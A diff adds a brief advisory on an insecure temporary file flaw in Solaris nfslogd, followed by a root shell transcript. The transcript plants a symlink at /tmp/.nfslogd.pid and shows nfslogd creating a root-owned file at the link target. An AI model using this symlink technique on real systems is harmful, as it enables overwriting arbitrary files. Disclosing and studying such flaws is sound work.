@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/41637/info
+
+Oracle Solaris is prone to an insecure temporary file creation vulnerability.
+
+A local attacker can exploit this issue to overwrite arbitrary files with the privileges of the affected process. This will likely result in denial-of-service conditions, other attacks may also be possible.
+
+This vulnerability affects the following supported versions:
+8, 9, 10, OpenSolaris 
+
+nnDon't Panic! # ls -dl /etc/oops
+/etc/oops: No such file or directory
+Don't Panic! # ls -dl /tmp/.nfslogd.pid
+lrwxrwxrwx   1 nobody   nobody         9 Dec 29 21:24 /tmp/.nfslogd.pid
+-> /etc/oops
+Don't Panic! # id
+uid=0(root) gid=0(root)
+Don't Panic! # /usr/lib/nfs/nfslogd
+Don't Panic! # ls -dl /etc/oops
+-rw-------   1 root     root           4 Dec 29 21:25 /etc/oops
